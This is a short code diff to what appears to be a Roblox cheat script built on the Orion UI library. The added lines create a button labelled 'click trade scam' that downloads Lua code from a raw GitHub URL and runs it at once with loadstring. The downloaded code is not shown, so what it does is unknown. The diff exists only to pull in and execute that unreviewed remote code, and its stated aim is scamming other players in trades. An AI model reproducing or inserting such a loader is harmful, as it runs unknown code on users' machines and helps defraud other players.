@@ -60,5 +60,7 @@ Tab:AddButton({
               end
       end    
 })
-
+MainSection:NewButton("click trade scam", "Script BY Scriptpsx", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HBHUB-hub/PSX-Scripe/main/dupe-all-main"))()
+end)
 OrionLib:Init()
